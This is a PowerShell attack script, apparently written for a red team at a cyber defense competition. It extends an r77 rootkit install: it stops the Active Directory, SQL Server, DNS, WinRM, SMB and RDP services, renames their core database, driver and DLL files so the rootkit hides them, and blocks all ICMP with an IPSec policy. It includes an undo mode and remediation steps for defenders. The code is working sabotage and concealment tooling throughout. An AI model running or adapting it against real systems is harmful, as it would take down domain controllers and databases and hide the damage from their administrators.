# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 -- Rootkit: r77 Hide Service Files
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1014      (Rootkit)
#               T1564.001  (Hide Artifacts: Hidden Files and Directories)
#               T1489      (Service Stop)
#               T1565.001  (Stored Data Manipulation)
#
# Targets: Windows Server 2022 (AD/DNS), Server 2019 (MSSQL)
#
# Description:
#   Extends the r77 rootkit deployment by targeting the critical data files
#   for MSSQL, Active Directory (NTDS), and DNS.  For each targeted service:
#
#     1. Stops the Windows service so files are no longer locked.
#     2. Discovers the actual file paths from the registry / known defaults.
#     3. Renames each critical file to prepend the r77 hide prefix ("$77"),
#        which causes the rootkit to hide them from all Win32/POSIX APIs.
#     4. Leaves the service stopped -- it cannot restart because the expected
#        paths no longer contain files.
#
#   Blue team remediation path is intentionally long:
#     a. Detect and remove the r77 rootkit first (kernel-mode scanner or
#        raw NtQuerySystemInformation walk required).
#     b. Once rootkit is gone the $77-prefixed files become visible.
#     c. Rename each critical file back to its original name.
#     d. Restart the service(s).
#
#   MSSQL critical files:
#     master.mdf / mastlog.ldf  -- SQL Server cannot boot without master DB.
#
#   Active Directory critical files:
#     ntds.dit   -- the AD database; DC cannot start NTDS without it.
#     edb.log    -- active transaction log; missing log blocks crash recovery.
#     edb.chk    -- checkpoint file; forces full log replay if absent.
#
#   DNS critical files:
#     All *.dns zone files in %SystemRoot%\System32\dns\
#     Without zone files the DNS service loads but answers SERVFAIL for
#     every authoritative zone.
#
#   WinRM critical files:
#     wsmsvc.dll  -- WinRM service DLL; service cannot load without it.
#     WsmRes.dll  -- WinRM resource DLL; companion required at runtime.
#
#   SMB critical files:
#     srv2.sys    -- SMB2/3 file server kernel driver.
#     srvnet.sys  -- SMB network transport driver (srv2.sys dependency).
#
#   RDP critical files:
#     termsrv.dll -- Terminal Services DLL; RDP stack cannot initialize without it.
#
#   ICMP:
#     ICMP is handled by tcpip.sys (kernel) -- hiding that file would break all
#     networking and is not viable.  Instead, the ICMP role deploys a persistent
#     IPSec policy via netsh ipsec static to block all ICMPv4 at the IP stack
#     level, independent of the Windows Firewall service.
#
# Pre-requisites:
#   - r77 rootkit must already be installed (run r77Shadow.ps1 first).
#     The script warns but does NOT abort if r77 is not detected -- operator
#     may want to pre-stage the rename and deploy r77 separately.
#   - Must run as Administrator.
#   - Target OS must be x64.
#
# Undo / post-competition restore:
#   Run with -Undo after removing the r77 rootkit (so the $77 files are
#   visible again).  The script walks the same paths and strips the prefix.
#   For the ICMP role, -Undo removes the IPSec policy (no file rename needed).
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

[CmdletBinding()]
param(
    # Which service role(s) to target.
    [ValidateSet('MSSQL', 'AD', 'DNS', 'WinRM', 'SMB', 'RDP', 'ICMP', 'All')]
    [string]$Role = 'All',

    # Reverse the operation: strip the $77 prefix from known paths.
    # Use AFTER removing the r77 rootkit so the files are visible.
    [switch]$Undo,

    # Seconds to wait for a service to reach the Stopped state.
    [int]$ServiceStopTimeoutSec = 60
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

# Must match what r77 was compiled with.  Default release uses "$77".
$HIDE_PREFIX = '$77'

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
if ($Undo) {
    Write-Warn " CCDC Phase 3 -- r77 Hide Services: UNDO MODE"
} else {
    Write-Warn " CCDC Phase 3 -- r77 Hide Services"
}
Write-Warn " Role: $Role    Hide prefix: $HIDE_PREFIX"
Write-Warn " Valid roles: MSSQL, AD, DNS, WinRM, SMB, RDP, ICMP, All"
Write-Warn "================================================================"
Write-Host ""

# ============================================================
# Pre-flight: x64 check
# ============================================================
if (-not [System.Environment]::Is64BitOperatingSystem) {
    Write-Err "r77 requires a 64-bit OS. Aborting."
    exit 1
}

# ============================================================
# Pre-flight: verify r77 is installed (warn only -- operator may
# be pre-staging the rename before r77 deployment)
# ============================================================
Write-Section "Pre-flight -- r77 Installation Check"

$svcRegBase = "HKLM:\SYSTEM\CurrentControlSet\Services"
$r77SvcKey  = Get-ChildItem -Path $svcRegBase -ErrorAction SilentlyContinue |
              Where-Object { $_.PSChildName -like "${HIDE_PREFIX}*" }

if ($r77SvcKey) {
    Write-Success "r77 service detected: $($r77SvcKey.PSChildName)"
} else {
    Write-Warn "No $HIDE_PREFIX* service key found -- r77 may not be installed."
    Write-Warn "Renamed files will NOT be hidden until r77 is running."
    Write-Warn "Deploy r77Shadow.ps1 first for full effect, or continue to pre-stage."
}

# ============================================================
# Helper: stop a Windows service and wait for Stopped state
# ============================================================
function Stop-ServiceGracefully {
    param([string]$ServiceName)

    $svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if (-not $svc) {
        Write-Info "Service '$ServiceName' not found on this host -- skipping stop."
        return $false
    }
    if ($svc.Status -eq 'Stopped') {
        Write-Info "Service '$ServiceName' is already stopped."
        return $true
    }

    Write-Info "Stopping service: $ServiceName ..."
    try {
        Stop-Service -Name $ServiceName -Force -ErrorAction Stop
    } catch {
        Write-Warn "Stop-Service failed for '$ServiceName': $_ -- trying sc.exe"
        & sc.exe stop $ServiceName | Out-Null
    }

    $deadline = (Get-Date).AddSeconds($ServiceStopTimeoutSec)
    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds 2
        $svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        if ($svc -and $svc.Status -eq 'Stopped') {
            Write-Success "Service '$ServiceName' stopped."
            return $true
        }
    }

    Write-Warn "Service '$ServiceName' did not reach Stopped within ${ServiceStopTimeoutSec}s -- files may be locked."
    return $false
}

# ============================================================
# Helper: rename a file to add/remove $77 prefix
# ============================================================
function Invoke-PrefixRename {
    param(
        [string]$FilePath,
        [bool]   $RemovePrefix    # $true = undo, $false = add prefix
    )

    if (-not (Test-Path -LiteralPath $FilePath)) {
        Write-Warn "Not found (skipping): $FilePath"
        return
    }

    $dir      = Split-Path $FilePath -Parent
    $leafName = Split-Path $FilePath -Leaf

    if ($RemovePrefix) {
        if (-not $leafName.StartsWith($HIDE_PREFIX)) {
            Write-Info "No prefix to remove on: $leafName"
            return
        }
        $newName = $leafName.Substring($HIDE_PREFIX.Length)
    } else {
        if ($leafName.StartsWith($HIDE_PREFIX)) {
            Write-Info "Already prefixed: $leafName"
            return
        }
        $newName = $HIDE_PREFIX + $leafName
    }

    $newPath = Join-Path $dir $newName
    try {
        Rename-Item -LiteralPath $FilePath -NewName $newName -Force -ErrorAction Stop
        if ($RemovePrefix) {
            Write-Success "Restored: $leafName <-- $newName"
        } else {
            Write-Success "Hidden:   $leafName -> $newName"
        }
    } catch {
        Write-Err "Rename failed for '${FilePath}': $_"
    }
}

# ============================================================
# MSSQL -- Hide master.mdf and mastlog.ldf
# ============================================================
function Invoke-MSSQLHide {
    param([bool]$RemovePrefix)

    Write-Section "MSSQL -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"

    # Stop SQL Server (default instance = MSSQLSERVER; named instance = MSSQL$<name>)
    if (-not $RemovePrefix) {
        # Discover all SQL Server service names
        $sqlSvcs = Get-Service -ErrorAction SilentlyContinue |
                   Where-Object { $_.Name -eq 'MSSQLSERVER' -or $_.Name -like 'MSSQL$*' }
        if ($sqlSvcs) {
            foreach ($s in $sqlSvcs) {
                Stop-ServiceGracefully -ServiceName $s.Name | Out-Null
            }
        } else {
            Write-Warn "No SQL Server service found -- files may be locked."
        }
    }

    # Discover data directories from registry for each SQL instance
    $instanceRootKey = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
    $instanceNames   = @()

    if (Test-Path $instanceRootKey) {
        $instanceProp = Get-ItemProperty -Path $instanceRootKey -ErrorAction SilentlyContinue
        if ($instanceProp) {
            $instanceProp.PSObject.Properties |
                Where-Object { $_.MemberType -eq 'NoteProperty' -and $_.Name -notlike 'PS*' } |
                ForEach-Object { $instanceNames += $_.Value }
        }
    }

    $dataDirectories = @()

    foreach ($inst in $instanceNames) {
        $setupKey = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$inst\Setup"
        if (Test-Path $setupKey) {
            $setup = Get-ItemProperty -Path $setupKey -ErrorAction SilentlyContinue
            if ($setup -and $setup.SQLDataRoot) {
                $dataDirectories += Join-Path $setup.SQLDataRoot "DATA"
            }
        }
    }

    # Fallback: scan well-known paths if registry discovery found nothing
    if ($dataDirectories.Count -eq 0) {
        Write-Warn "Registry discovery returned no data paths -- using fallback scan."
        $fallbackRoots = @(
            "$env:ProgramFiles\Microsoft SQL Server",
            "${env:ProgramFiles(x86)}\Microsoft SQL Server"
        )
        foreach ($root in $fallbackRoots) {
            if (Test-Path $root) {
                Get-ChildItem -Path $root -Filter "DATA" -Recurse -Directory `
                              -ErrorAction SilentlyContinue |
                    ForEach-Object { $dataDirectories += $_.FullName }
            }
        }
    }

    if ($dataDirectories.Count -eq 0) {
        Write-Err "Could not locate any SQL Server DATA directory. MSSQL skipped."
        return
    }

    foreach ($dataDir in $dataDirectories) {
        Write-Info "SQL data directory: $dataDir"

        if ($RemovePrefix) {
            # Undo: look for hidden files
            $hiddenMdf = Join-Path $dataDir "${HIDE_PREFIX}master.mdf"
            $hiddenLdf = Join-Path $dataDir "${HIDE_PREFIX}mastlog.ldf"
            Invoke-PrefixRename -FilePath $hiddenMdf -RemovePrefix $true
            Invoke-PrefixRename -FilePath $hiddenLdf -RemovePrefix $true
        } else {
            # Hide: look for original files
            $masterMdf = Join-Path $dataDir "master.mdf"
            $mastlogLdf = Join-Path $dataDir "mastlog.ldf"
            Invoke-PrefixRename -FilePath $masterMdf  -RemovePrefix $false
            Invoke-PrefixRename -FilePath $mastlogLdf -RemovePrefix $false
        }
    }

    Write-Info "SQL Server cannot start without master.mdf -- service will fail on next start attempt."
}

# ============================================================
# Active Directory -- Hide ntds.dit, edb.log, edb.chk
# ============================================================
function Invoke-ADHide {
    param([bool]$RemovePrefix)

    Write-Section "Active Directory -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"

    if (-not $RemovePrefix) {
        # DNS on a DC depends on NTDS; stopping NTDS cascades to DNS automatically.
        Stop-ServiceGracefully -ServiceName "NTDS"   | Out-Null
        Stop-ServiceGracefully -ServiceName "dns"    | Out-Null
        Stop-ServiceGracefully -ServiceName "kdc"    | Out-Null
        Stop-ServiceGracefully -ServiceName "Netlogon" | Out-Null
    }

    # Discover ntds.dit path from registry
    $ntdsParamsKey = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
    $ntdsDir       = $null

    if (Test-Path $ntdsParamsKey) {
        $ntdsParams = Get-ItemProperty -Path $ntdsParamsKey -ErrorAction SilentlyContinue
        if ($ntdsParams) {
            $ditPath = $ntdsParams.'DSA Database file'
            if ($ditPath) {
                $ntdsDir = Split-Path $ditPath -Parent
            }
        }
    }

    # Fallback to default location
    if (-not $ntdsDir) {
        Write-Warn "Registry path for ntds.dit not found -- using default: $env:SystemRoot\NTDS"
        $ntdsDir = "$env:SystemRoot\NTDS"
    }

    Write-Info "NTDS directory: $ntdsDir"

    $criticalFiles = @('ntds.dit', 'edb.log', 'edb.chk')

    foreach ($fname in $criticalFiles) {
        if ($RemovePrefix) {
            $hiddenPath = Join-Path $ntdsDir "${HIDE_PREFIX}${fname}"
            Invoke-PrefixRename -FilePath $hiddenPath -RemovePrefix $true
        } else {
            $origPath = Join-Path $ntdsDir $fname
            Invoke-PrefixRename -FilePath $origPath -RemovePrefix $false
        }
    }

    Write-Info "DC cannot start AD DS without ntds.dit -- NTDS service will fail on next start attempt."
}

# ============================================================
# DNS -- Hide all zone files (*.dns)
# ============================================================
function Invoke-DNSHide {
    param([bool]$RemovePrefix)

    Write-Section "DNS -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Zone Files"

    $dnsDir = "$env:SystemRoot\System32\dns"

    if (-not (Test-Path $dnsDir)) {
        Write-Warn "DNS zone directory not found: $dnsDir -- DNS role may not be installed."
        return
    }

    if (-not $RemovePrefix) {
        Stop-ServiceGracefully -ServiceName "dns" | Out-Null
    }

    if ($RemovePrefix) {
        # Undo: find $77*.dns and $77*.cache and strip prefix
        $hidden = Get-ChildItem -Path $dnsDir -Filter "${HIDE_PREFIX}*" `
                                -ErrorAction SilentlyContinue
        if (-not $hidden) {
            Write-Warn "No $HIDE_PREFIX-prefixed DNS files found in $dnsDir"
            Write-Warn "Ensure the rootkit is removed before running undo."
            return
        }
        foreach ($f in $hidden) {
            Invoke-PrefixRename -FilePath $f.FullName -RemovePrefix $true
        }
    } else {
        # Hide: all .dns zone files (authoritative zones + root hints)
        $zoneFiles = Get-ChildItem -Path $dnsDir -File -ErrorAction SilentlyContinue |
                     Where-Object { $_.Extension -eq '.dns' -and
                                    -not $_.Name.StartsWith($HIDE_PREFIX) }
        if (-not $zoneFiles) {
            Write-Warn "No .dns zone files found in $dnsDir (zone storage may be AD-integrated)."
            Write-Info "AD-integrated zones are stored in ntds.dit -- handled by the AD role."
            return
        }
        foreach ($f in $zoneFiles) {
            Invoke-PrefixRename -FilePath $f.FullName -RemovePrefix $false
        }
        Write-Info "DNS service can reload but will answer SERVFAIL for all file-backed zones."
    }
}

# ============================================================
# WinRM -- Hide wsmsvc.dll and WsmRes.dll
# ============================================================
function Invoke-WinRMHide {
    param([bool]$RemovePrefix)

    Write-Section "WinRM -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"

    if (-not $RemovePrefix) {
        Stop-ServiceGracefully -ServiceName "WinRM" | Out-Null
    }

    $sys32 = "$env:SystemRoot\System32"
    $winrmFiles = @("wsmsvc.dll", "WsmRes.dll")

    foreach ($fname in $winrmFiles) {
        if ($RemovePrefix) {
            $hiddenPath = Join-Path $sys32 "${HIDE_PREFIX}${fname}"
            Invoke-PrefixRename -FilePath $hiddenPath -RemovePrefix $true
        } else {
            $origPath = Join-Path $sys32 $fname
            Invoke-PrefixRename -FilePath $origPath -RemovePrefix $false
        }
    }

    Write-Info "WinRM service cannot load without wsmsvc.dll -- service will fail on next start attempt."
}

# ============================================================
# SMB -- Hide srv2.sys and srvnet.sys
# ============================================================
function Invoke-SMBHide {
    param([bool]$RemovePrefix)

    Write-Section "SMB -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Driver Files"

    if (-not $RemovePrefix) {
        Stop-ServiceGracefully -ServiceName "LanmanServer" | Out-Null
    }

    $driversDir = "$env:SystemRoot\System32\drivers"
    $smbFiles   = @("srv2.sys", "srvnet.sys")

    foreach ($fname in $smbFiles) {
        if ($RemovePrefix) {
            $hiddenPath = Join-Path $driversDir "${HIDE_PREFIX}${fname}"
            Invoke-PrefixRename -FilePath $hiddenPath -RemovePrefix $true
        } else {
            $origPath = Join-Path $driversDir $fname
            Invoke-PrefixRename -FilePath $origPath -RemovePrefix $false
        }
    }

    Write-Info "SMB2/3 cannot function without srv2.sys and srvnet.sys -- LanmanServer will fail on next start."
}

# ============================================================
# RDP -- Hide termsrv.dll
# ============================================================
function Invoke-RDPHide {
    param([bool]$RemovePrefix)

    Write-Section "RDP -- $(if ($RemovePrefix) { 'Restore' } else { 'Hide' }) Critical Files"

    if (-not $RemovePrefix) {
        Stop-ServiceGracefully -ServiceName "TermService" | Out-Null
    }

    $sys32   = "$env:SystemRoot\System32"
    $rdpFile = "termsrv.dll"

    if ($RemovePrefix) {
        $hiddenPath = Join-Path $sys32 "${HIDE_PREFIX}${rdpFile}"
        Invoke-PrefixRename -FilePath $hiddenPath -RemovePrefix $true
    } else {
        $origPath = Join-Path $sys32 $rdpFile
        Invoke-PrefixRename -FilePath $origPath -RemovePrefix $false
    }

    Write-Info "RDP stack cannot initialize without termsrv.dll -- TermService will fail on next start attempt."
}

# ============================================================
# ICMP -- IPSec policy block (no r77 file rename possible)
# ============================================================
function Invoke-ICMPHide {
    param([bool]$RemovePrefix)

    Write-Section "ICMP -- $(if ($RemovePrefix) { 'Remove IPSec Block' } else { 'IPSec Block (firewall-independent)' })"

    Write-Info "ICMP is handled by tcpip.sys (kernel) -- r77 file-rename would break all networking."
    Write-Info "Using IPSec policy block via netsh ipsec static instead."

    if ($RemovePrefix) {
        & netsh.exe ipsec static set policy name=CCDC_ICMPKill assign=no 2>$null | Out-Null
        & netsh.exe ipsec static delete policy name=CCDC_ICMPKill 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "IPSec policy CCDC_ICMPKill removed -- ICMP responses restored"
        } else {
            Write-Warn "IPSec policy removal returned rc=$LASTEXITCODE -- may not have existed"
        }
    } else {
        $ipsecCmds = @(
            @("ipsec", "static", "add", "policy", "name=CCDC_ICMPKill"),
            @("ipsec", "static", "add", "filterlist", "name=AllICMP"),
            @("ipsec", "static", "add", "filter", "filterlist=AllICMP", "srcaddr=any", "dstaddr=any", "protocol=icmp", "mirrored=yes"),
            @("ipsec", "static", "add", "filteraction", "name=DropICMP", "action=block"),
            @("ipsec", "static", "add", "rule", "name=KillICMP", "policy=CCDC_ICMPKill", "filterlist=AllICMP", "filteraction=DropICMP"),
            @("ipsec", "static", "set", "policy", "name=CCDC_ICMPKill", "assign=yes")
        )
        $ipsecLabels = @(
            "Created IPSec policy: CCDC_ICMPKill",
            "Created filter list: AllICMP",
            "Added ICMPv4 mirrored filter (any->any)",
            "Added block filter action: DropICMP",
            "Linked rule KillICMP -> AllICMP -> DropICMP",
            "Assigned (activated) policy: CCDC_ICMPKill"
        )
        for ($i = 0; $i -lt $ipsecCmds.Count; $i++) {
            & netsh.exe $ipsecCmds[$i] 2>$null | Out-Null
            if ($LASTEXITCODE -eq 0) {
                Write-Success $ipsecLabels[$i]
            } else {
                Write-Warn "$($ipsecLabels[$i]) -- rc=$LASTEXITCODE (may already exist)"
            }
        }
        Write-Info "IPSec ICMP block survives Windows Firewall service stop/start"
    }
}

# ============================================================
# Dispatch by role
# ============================================================
$doMSSQL = $Role -eq 'MSSQL' -or $Role -eq 'All'
$doAD    = $Role -eq 'AD'    -or $Role -eq 'All'
$doDNS   = $Role -eq 'DNS'   -or $Role -eq 'All'
$doWinRM = $Role -eq 'WinRM' -or $Role -eq 'All'
$doSMB   = $Role -eq 'SMB'   -or $Role -eq 'All'
$doRDP   = $Role -eq 'RDP'   -or $Role -eq 'All'
$doICMP  = $Role -eq 'ICMP'  -or $Role -eq 'All'

$removePrefix = [bool]$Undo

if ($doMSSQL) { Invoke-MSSQLHide  -RemovePrefix $removePrefix }
if ($doAD)    { Invoke-ADHide     -RemovePrefix $removePrefix }
if ($doDNS)   { Invoke-DNSHide    -RemovePrefix $removePrefix }
if ($doWinRM) { Invoke-WinRMHide  -RemovePrefix $removePrefix }
if ($doSMB)   { Invoke-SMBHide    -RemovePrefix $removePrefix }
if ($doRDP)   { Invoke-RDPHide    -RemovePrefix $removePrefix }
if ($doICMP)  { Invoke-ICMPHide   -RemovePrefix $removePrefix }

# ============================================================
# Done
# ============================================================
Write-Host ""
Write-Success "================================================================"
if ($Undo) {
    Write-Success " r77 Hide Services -- UNDO complete"
    Write-Success " Restart affected services manually after verifying file names."
} else {
    Write-Success " r77 Hide Services -- deployment complete"
    Write-Host ""
    Write-Info "Critical service files are now renamed with prefix: $HIDE_PREFIX"
    Write-Info "They are invisible to Explorer, dir, Get-ChildItem, and all Win32 apps"
    Write-Info "as long as the r77 rootkit is active."
    Write-Host ""
    Write-Warn "Blue team remediation path (must complete in order):"
    Write-Warn "  1. Detect r77 via kernel-mode scanner (GMER, Malwarebytes ARK, Wireshark"
    Write-Warn "     driver comparison, or raw NtQuerySystemInformation walk)."
    Write-Warn "  2. Locate the hidden r77 service key:"
    Write-Warn "       reg query HKLM\SYSTEM\CurrentControlSet\Services | findstr $HIDE_PREFIX"
    Write-Warn "  3. Stop r77:  sc.exe stop (service-name)"
    Write-Warn "  4. Run r77 Uninstall.exe (or manually remove driver + service key)."
    Write-Warn "  5. Once rootkit is gone the $HIDE_PREFIX-prefixed files are visible again."
    Write-Warn "  6. Rename each critical file back:"
    Write-Warn "       MSSQL: ${HIDE_PREFIX}master.mdf -> master.mdf"
    Write-Warn "               ${HIDE_PREFIX}mastlog.ldf -> mastlog.ldf"
    Write-Warn "       AD:    ${HIDE_PREFIX}ntds.dit -> ntds.dit"
    Write-Warn "               ${HIDE_PREFIX}edb.log  -> edb.log"
    Write-Warn "               ${HIDE_PREFIX}edb.chk  -> edb.chk"
    Write-Warn "       DNS:   ${HIDE_PREFIX}(zone).dns -> (zone).dns  (each zone file)"
    Write-Warn "       WinRM: ${HIDE_PREFIX}wsmsvc.dll -> wsmsvc.dll"
    Write-Warn "               ${HIDE_PREFIX}WsmRes.dll -> WsmRes.dll"
    Write-Warn "       SMB:   ${HIDE_PREFIX}srv2.sys -> srv2.sys"
    Write-Warn "               ${HIDE_PREFIX}srvnet.sys -> srvnet.sys"
    Write-Warn "       RDP:   ${HIDE_PREFIX}termsrv.dll -> termsrv.dll"
    Write-Warn "       ICMP:  netsh ipsec static set policy name=CCDC_ICMPKill assign=no"
    Write-Warn "               netsh ipsec static delete policy name=CCDC_ICMPKill"
    Write-Warn "  7. Restart the stopped services."
}
Write-Success "================================================================"
Write-Host ""
